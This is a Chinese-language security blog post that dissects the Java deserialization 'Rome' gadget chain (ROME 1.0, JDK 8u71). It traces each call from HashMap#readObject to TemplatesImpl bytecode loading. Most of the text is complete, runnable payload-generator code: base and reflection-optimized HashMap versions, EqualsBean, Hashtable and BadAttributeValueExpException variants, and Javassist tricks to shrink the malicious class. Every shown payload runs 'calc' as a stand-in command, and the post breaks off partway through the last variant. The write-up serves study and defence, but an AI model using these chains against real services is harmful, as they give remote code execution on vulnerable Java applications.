# 漏洞篇 - Java 反序列化之 Rome 链
> 2024-06-07
> 来源：https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/

ROME 是一个强大的 Java 库，用于解析和生成各种格式的 RSS 和 Atom feeds 。它兼容多种版本的 RSS（包括 RSS 0.90、0.91、0.92、0.93、0.94、1.0 和 2.0 ）和 Atom（包括 0.3 和 1.0 ）。ROME 提供了一个统一的 API ，简化了处理不同 feed 格式的复杂性。

## 前置知识概览

### Rome 介绍

ROME 是一个强大的 Java 库，用于解析和生成各种格式的 RSS 和 Atom feeds 。它兼容多种版本的 RSS（包括 RSS 0.90、0.91、0.92、0.93、0.94、1.0 和 2.0 ）和 Atom（包括 0.3 和 1.0 ）。ROME 提供了一个统一的 API ，简化了处理不同 feed 格式的复杂性。

### 什么是 feed

在 Web 技术中，” feed “ 指的是一种特定的格式，应用于定期更新和发布内容的文件。它允许用户通过订阅机制获取最新的内容更新。Feed 通常用于博客、新闻网站、播客和其他频繁更新的网站，以便用户可以集中阅读和获取最新的内容，而无需逐一访问这些网站。

**Feed 的工作原理**

1.  发布：网站创建和发布 feed 文件，这个文件包含最新的内容更新。
2.  订阅：用户通过 feed 阅读器订阅该 feed 。阅读器会定期检查 feed 文件的更新。
3.  通知：当 feed 文件更新时，阅读器会下载新的内容并通知用户。

**Feed 的常见格式**

1.  **RSS** (Really Simple Syndication)：RSS 是一种 XML 格式，用于描述网站内容的更新。RSS 最初由 Netscape 在 1999 年开发，目的是方便内容的聚合和订阅。RSS 有多个版本，最常用的是 RSS 2.0 。
2.  **Atom**：Atom 是一种 XML 格式，用于描述和同步 Web 内容的更新。它是由 IETF（互联网工程任务组）在 2005 年发布的标准，比 RSS 稍晚推出，目的是解决 RSS 的一些局限性。

## 环境搭建

我个人本次实验环境为：

-   JDK = 8u71
-   rome = 1.0

导入 rome 依赖：

```
<dependency>
    <groupId>rome</groupId>
    <artifactId>rome</artifactId>
    <version>1.0</version>
</dependency>
```

## ysoserial 利用链分析

Rome 链的核心在于 ToStringBean#toString(String) 方法会调用一个类的所有公共 getter 和 setter 方法，于是我们让他来调用 TemplatesImpl#getOutputProperties() 方法。

### TemplatesImpl#getOutputProperties()

TemplatesImpl 的 getOutputProperties() 方法会调用 newTransformer() ，进而造成类加载：

```
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

之后的利用链就是 TemplatesImpl 的常规用法：

```
TemplatesImpl#newTransformer()
	TemplatesImpl#getTransletInstance()
		TemplatesImpl#defineTransletClasses()
			TransletClassLoader#defineClass()
```

### BeanIntrospector#getPDs(Class)

BeanIntrospector 的 getPDs 方法会利用反射获取一个类的所有公共 getter 和 setter 方法：

```
private static PropertyDescriptor[] getPDs(Class klass) throws IntrospectionException {
	// 利用反射获取传入的 Class 对象的所有 public 方法
    Method[] methods = klass.getMethods();
    Map getters = getPDs(methods,false);
    Map setters = getPDs(methods,true);
    List pds     = merge(getters,setters);
    PropertyDescriptor[] array = new PropertyDescriptor[pds.size()];
    pds.toArray(array);
    return array;
}
```

这里选择传入 Templates.class 作为参数，原因是 Templates 接口中只定义了两个方法，且包含我们所需要的 getOutputProperties()，可以排除大量干扰。

### BeanIntrospector#getPropertyDescriptors(Class)

BeanIntrospector 的 getPropertyDescriptors 方法调用了 getPDs 方法：

```
public static synchronized PropertyDescriptor[] getPropertyDescriptors(Class klass) throws IntrospectionException {
    PropertyDescriptor[] descriptors = (PropertyDescriptor[]) _introspected.get(klass);
    if (descriptors==null) {
    	// 在这里调用
        descriptors = getPDs(klass);
        _introspected.put(klass,descriptors);
    }
    return descriptors;
}
```

同理，这里应当将 Templates.class 作为参数 klass 的值。

### ToStringBean#toString(String)

ToStringBean 的有参 toString 方法调用了 BeanIntrospector 的 getPropertyDescriptors 方法：

```
private String toString(String prefix) {
    StringBuffer sb = new StringBuffer(128);
    try {
    	// 在这里调用
        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);
        if (pds!=null) {
            for (int i=0;i<pds.length;i++) {
                String pName = pds[i].getName();
                Method pReadMethod = pds[i].getReadMethod();
                if (pReadMethod!=null &&                             // ensure it has a getter method
                    pReadMethod.getDeclaringClass()!=Object.class && // filter Object.class getter methods
                    pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters
                    // 在这里执行 getPropertyDescriptors 方法
                    Object value = pReadMethod.invoke(_obj,NO_PARAMS);
                    printProperty(sb,prefix+"."+pName,value);
                }
            }
        }
    }
    catch (Exception ex) {
        sb.append("\n\nEXCEPTION: Could not complete "+_obj.getClass()+".toString(): "+ex.getMessage()+"\n");
    }
    return sb.toString();
}
```

那么这里应当将 \_beanClass 设置成 Templates.class 。\_beanClass 是 ToStringBean 中定义的属性，在构造方法中被赋值。

Templates 中的两个方法只有 getOutputProperties() 是 getter 方法，所以经过判断后只有 getOutputProperties() 会被执行：

```
Object value = pReadMethod.invoke(_obj,NO_PARAMS);
```

invoke 方法的第一个参数是执行此方法的对象，所以要将 \_obj 设置成 TemplatesImpl 对象，同样可以在构造方法中赋值。

### ToStringBean#toString()

ToStringBean 的无参 toString 方法调用了有参 toString 方法：

```
public String toString() {
    Stack stack = (Stack) PREFIX_TL.get();
    String[] tsInfo = (String[]) ((stack.isEmpty()) ? null : stack.peek());
    String prefix;
    if (tsInfo==null) {
        String className = _obj.getClass().getName();
        prefix = className.substring(className.lastIndexOf(".")+1);
    }
    else {
        prefix = tsInfo[0];
        tsInfo[1] = prefix;
    }
    // 在这里调用
    return toString(prefix);
}
```

到这里可以先写个小程序验证一下。

### 写个小程序验证一下

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ROME_toString {

    public static void main(String[] args) throws Exception {
        // 将恶意类的字节码文件存入字节数组
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\Rome利用链分析\\RomeTest\\target\\classes\\Eval.class"));

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl,"_name","aaa");
        setValue(templatesImpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 在构造方法中将 _beanClass 赋值成 Templates.class, _obj 赋值成 TemplatesImpl 对象
        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl);
        // 利用 toString 命令执行
        toStringBean.toString();
    }

    // 反射设置属性值的过程可以抽离成一个方法
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

其中 Eval 类内容如下：

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Eval extends AbstractTranslet {
    public Eval() {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {
            throw new RuntimeException(var1);
        }
    }
}
```

运行后成功弹出计算器，验证完成。

### EqualsBean#beanHashCode()

EqualsBean 的 beanHashCode() 方法会调用其成员属性 \_obj 的 toString() 方法：

```
public int beanHashCode() {
    return _obj.toString().hashCode();
}
```

只需要将 \_obj 设置成 ToStringBean 对象即可。

### ObjectBean#hashCode()

ObjectBean 的 hashCode() 方法会调用其成员属性 \_equalsBean 的 beanHashCode() 方法：

```
public int hashCode() {
    return _equalsBean.beanHashCode();
}
```

\_equalsBean 在其构造方法中是这样被赋值的：

```
public ObjectBean(Class beanClass,Object obj,Set ignoreProperties) {
    _equalsBean = new EqualsBean(beanClass,obj);
    _toStringBean = new ToStringBean(beanClass,obj);
    _cloneableBean = new CloneableBean(obj,ignoreProperties);
}
```

可以看到这里是 new 了一个 EqualsBean 对象。

### HashMap#hash(Object)

HashMap 的 hash 方法会调用 key 的 hashCode() 方法：

```
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

### HashMap#readObject(java.io.ObjectInputStream)

入口，经典永流传。

```
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            // 在这里调用 hash 方法
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

至此，这条链子就剖析完成了。

### 调用栈总结

1.  HashMap#readObject(java.io.ObjectInputStream)
2.  HashMap#hash(Object)
3.  ObjectBean#hashCode()
4.  EqualsBean#beanHashCode()
5.  ToStringBean#toString()
6.  ToStringBean#toString(String)
7.  BeanIntrospector#getPropertyDescriptors(Class)
8.  BeanIntrospector#getPDs(Class)
9.  TemplatesImpl#getOutputProperties()
10.  TemplatesImpl#newTransformer()
11.  TemplatesImpl#getTransletInstance()
12.  TemplatesImpl#defineTransletClasses()
13.  TransletClassLoader#defineClass()

### 构造 payload

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class payload {
    public static void main(String[] args) throws Exception {
        // 将恶意类的字节码文件存入字节数组
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\Rome利用链分析\\RomeTest\\target\\classes\\Eval.class"));

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl,"_name","aaa");
        setValue(templatesImpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法
        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl);

        // 利用 EqualsBean 的 beanHashCode() 方法调用 ToStringBean 的 toString() 方法
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        // 利用 ObjectBean 的 hashCode() 方法调用 EqualsBean 的 beanHashCode() 方法
        // 为防止调用 put 方法时命令执行，先传入一个普通的 ObjectBean
        HashMap hashMap0 = new HashMap();
        ObjectBean objectBean = new ObjectBean(HashMap.class, hashMap0);

        // HashMap 的 hash() 方法会调用 key 的 hashCode() 方法，readObject() 方法会调用 hash() 方法
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "test");

        // 反射修改 ObjectBean 的属性值
        setValue(objectBean, "_equalsBean", equalsBean);

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    // 反射设置属性值的过程可以抽离成一个方法
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

### 反射修改 HashMap 的 key 值以优化 payload

在调用 HashMap 的 put 方法时，总是会因为 put 方法要调用 putVal 方法或者 hash 而导致提前命令执行，是否可以通过反射修改 HashMap 的 key 值呢？枫の师傅的文章中给出了解决方案。

HashMap 的 put 方法：

```
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```

HashMap 的 putVal 方法：

```
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node<K,V>[] tab; Node<K,V> p; int n, i;
    if ((tab = table) == null || (n = tab.length) == 0)
        n = (tab = resize()).length;
    if ((p = tab[i = (n - 1) & hash]) == null)
        tab[i] = newNode(hash, key, value, null);
    else {
        Node<K,V> e; K k;
        if (p.hash == hash &&
            ((k = p.key) == key || (key != null && key.equals(k))))
            e = p;
        else if (p instanceof TreeNode)
            e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
        else {
            for (int binCount = 0; ; ++binCount) {
                if ((e = p.next) == null) {
                    p.next = newNode(hash, key, value, null);
                    if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                        treeifyBin(tab, hash);
                    break;
                }
                if (e.hash == hash &&
                    ((k = e.key) == key || (key != null && key.equals(k))))
                    break;
                p = e;
            }
        }
        if (e != null) { // existing mapping for key
            V oldValue = e.value;
            if (!onlyIfAbsent || oldValue == null)
                e.value = value;
            afterNodeAccess(e);
            return oldValue;
        }
    }
    ++modCount;
    if (++size > threshold)
        resize();
    afterNodeInsertion(evict);
    return null;
}
```

这里用了一些算法，看不懂没关系，总之是进行了一个键值对的存储，这个键值对最终被插入到 table 数组的一个位置中，具体位置取决于计算得到的索引 i 。

table 是 HashMap 的一个属性，来看它的定义：

```
transient Node<K,V>[] table;
```

这个 Node<K,V> 是 HashMap 中定义的一个静态内部类：

![](https://changeyourway.github.io/images/image-20240606153409911.png)

也就是说，我们调用 put 方法存进来的键值对最终是以 Node<K,V> 对象的形式存放在数组里面的。

那么，我们可以用以下方式来修改 key ：

```
// 新建 HashMap 对象，设置初始容量
HashMap<Object,Object> hashMap = new HashMap<>(1);
// 先存入无关数据
hashMap.put("test1", "test2");
// 反射获取 table 属性
Object[] table= (Object[]) getValue(hashMap,"table");
// 获取 table 数组中的 Node 对象
Object entry = table[1];
// 反射修改 Node 对象的 key 属性值
setValue(entry,"key",equalsBean);
```

其中 getValue 方法内容如下：

```
public static Object getValue(Object obj, String name) throws Exception{
    Field field = obj.getClass().getDeclaredField(name);
    field.setAccessible(true);
    return field.get(obj);
}
```

在此基础上，我们可以优化上面的 payload ：

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class payload {
    public static void main(String[] args) throws Exception {
        // 将恶意类的字节码文件存入字节数组
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\miaoj\\Documents\\Java安全代码实验\\Rome利用链分析\\RomeTest\\target\\classes\\Eval.class"));

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl,"_name","aaa");
        setValue(templatesImpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法
        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl);

        // 利用 EqualsBean 的 beanHashCode() 方法调用 ToStringBean 的 toString() 方法
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        // 利用 ObjectBean 的 hashCode() 方法调用 EqualsBean 的 beanHashCode() 方法
        ObjectBean objectBean = new ObjectBean(EqualsBean.class, equalsBean);

        // HashMap 的 hash() 方法会调用 key 的 hashCode() 方法，readObject() 方法会调用 hash() 方法
        HashMap hashMap = new HashMap(1);
        // 先存入无关数据
        hashMap.put("test1", "test2");
        // 反射获取 table 属性
        Object[] table= (Object[]) getValue(hashMap,"table");
        // 获取 table 数组中的 Node 对象
        Object entry = table[1];
        // 反射修改 Node 对象的 key 属性值
        setValue(entry,"key",objectBean);

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    // 反射设置属性值的过程可以抽离成一个方法
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getValue(Object obj, String name) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }
}
```

不过值得注意的是，这里获取到的 table 数组其中存储的 Node<K,V> 对象不一定是按顺序来的，不想看算法的话直接调试来看位置：

![](https://changeyourway.github.io/images/image-20240606172727041.png)

可以看到，这里键值对是存入了 table 数组中下标为 1 的位置，而且我们初始化时设定容量为 1 ，但是实际的 table 大小为 2 。所以这里建议不管有没有设置初始容量，都要具体情况具体分析，调试起来确定下标后再修改。

## 使用 Javassist 缩短字节码文件

在某些情况下，网站可能会对反序列化数据的长度有一定限制，所以有必要通过一些手段来缩短 Payload 。

有关 Javassist 的知识参见：[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-javassist%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97/)

前面我们用来被加载的 Eval 类是这样的：

```
public class Eval extends AbstractTranslet {
    // 恶意代码放在静态代码块中
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    // 需要重写父类的两个方法
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

由于 TemplatesImpl#defineTransletClasses() 方法会判断被加载的类是否继承了 AbstractTranslet ，如果没有就抛出异常，所以 Eval 类被迫继承了 AbstractTranslet ，又由于 AbstractTranslet 是个抽象类，继承了它就要重写它的一些方法，否则编译器报错。但其实这两个方法根本就没有用，造成了冗余。

可以用 javassist 来构建这样一个类，用 javassist 来操作字节码，添加静态代码块，继承父类，而不需要实现父类的方法，具体办法如下：

```
// 获取类池
ClassPool classPool = ClassPool.getDefault();
// 创建一个名为 Error 的类
CtClass error = classPool.makeClass("Error");
// 向 Error 对象中添加静态代码块
CtConstructor constructor = error.makeClassInitializer();
constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
// 设置 Error 的父类为 AbstractTranslet
CtClass abstractTranslet = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
error.setSuperclass(abstractTranslet);
// 将 Error 对象输出成字节数组
byte[] errorBytecode = error.toBytecode();
```

这样创建的对象中没有重写父类 AbstractTranslet 的两个方法，缩短了字节码长度。以后再也不用手写 Eval 类了。

## 变种利用链分析

核心依然是 TemplatesImpl#getOutputProperties() 。后面的 payload 统一用 javassist 来创建类。

### EqualsBean#hashCode() 链

用 EqualsBean#hashCode() 替换掉 ObjectBean#hashCode() 即可。

EqualsBean#hashCode() 内容如下：

```
public int hashCode() {
    return beanHashCode();
}
```

###### payload

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class EqualsBean_payload {
    public static void main(String[] args) throws Exception {
        // 获取类池
        ClassPool classPool = ClassPool.getDefault();
        // 创建一个名为 Error 的类
        CtClass error = classPool.makeClass("Error");
        // 向 Error 对象中添加静态代码块
        CtConstructor constructor = error.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        // 设置 Error 的父类为 AbstractTranslet
        CtClass abstractTranslet = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        error.setSuperclass(abstractTranslet);
        // 将 Error 对象输出成字节数组
        byte[] errorBytecode = error.toBytecode();

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl, "_name", "aaa");
        setValue(templatesImpl, "_bytecodes", new byte[][]{errorBytecode});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);

        // EqualsBean 的 beanHashCode() 方法会调用其成员属性 _obj 的 toString() 方法
        // EqualsBean 的 HashCode() 方法又会调用 beanHashCode() 方法
        // 为防止调用 put 方法时提前命令执行，先传入一个普通的 EqualsBean
        HashMap hashMapNull = new HashMap();
        EqualsBean equalsBean = new EqualsBean(HashMap.class, hashMapNull);

        // HashMap 的 hash() 方法会调用 key 的 hashCode() 方法，readObject() 方法会调用 hash() 方法
        HashMap hashMap = new HashMap();
        hashMap.put(equalsBean, "test");

        // 反射修改 ObjectBean 的属性值
        setValue(equalsBean, "_obj", toStringBean);

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    // 反射设置属性值的过程可以抽离成一个方法
    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

### HashTable 链

入口类改用 HashTable 即可。

调用链如下：

1.  Hashtable#readObject()
2.  Hashtable#reconstitutionPut()
3.  EqualsBean#hashCode()

Hashtable 的 reconstitutionPut() 方法会调用 key 的 hashCode() 方法：

![](https://changeyourway.github.io/images/image-20240606093903510.png)

###### payload

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Hashtable;

public class Hashtable_payload {
    public static void main(String[] args) throws Exception {
        // 获取类池
        ClassPool classPool = ClassPool.getDefault();
        // 创建一个名为 Error 的类
        CtClass error = classPool.makeClass("Error");
        // 向 Error 对象中添加静态代码块
        CtConstructor constructor = error.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        // 设置 Error 的父类为 AbstractTranslet
        CtClass abstractTranslet = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        error.setSuperclass(abstractTranslet);
        // 将 Error 对象输出成字节数组
        byte[] errorBytecode = error.toBytecode();

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl, "_name", "aaa");
        setValue(templatesImpl, "_bytecodes", new byte[][]{errorBytecode});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);

        // EqualsBean 的 beanHashCode() 方法会调用其成员属性 _obj 的 toString() 方法
        // EqualsBean 的 HashCode() 方法又会调用 beanHashCode() 方法
        // 为防止调用 put 方法时提前命令执行，先传入一个普通的 EqualsBean
        HashMap hashMapNull = new HashMap();
        EqualsBean equalsBean = new EqualsBean(HashMap.class, hashMapNull);

        // Hashtable 的 reconstitutionPut() 方法会调用 key 的 hashCode() 方法
        // Hashtable 的 readObject() 方法会调用 reconstitutionPut() 方法
        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(equalsBean, "test");

        // 反射修改 ObjectBean 的属性值
        setValue(equalsBean, "_obj", toStringBean);

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    // 反射设置属性值的过程可以抽离成一个方法
    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

### BadAttributeValueExpException 链

入口类改用 BadAttributeValueExpException 即可。CC5 链便是将这个类作为入口，不妨再复习一下。

BadAttributeValueExpException 的 readObject 方法调用了 valObj 的 toString 方法：

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
	// valObj 是从输入流中读取到的对象的 val 字段值
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        // 这里调用了 valObj 的 toString 方法
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

valObj 是从输入流中读取到的对象的 val 字段值，即 BadAttributeValueExpException 对象的 val 属性值。

不能用构造方法给 val 赋值，因为构造方法会提前调用 val 的 toString 方法，造成命令执行：

```
public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

所以这里选择反射修改 val 的值，将 val 的值设置成 ToStringBean 对象即可。

###### payload

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class BadAttributeValueExpException_payload {
    public static void main(String[] args) throws Exception {
        // 获取类池
        ClassPool classPool = ClassPool.getDefault();
        // 创建一个名为 Error 的类
        CtClass error = classPool.makeClass("Error");
        // 向 Error 对象中添加静态代码块
        CtConstructor constructor = error.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        // 设置 Error 的父类为 AbstractTranslet
        CtClass abstractTranslet = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
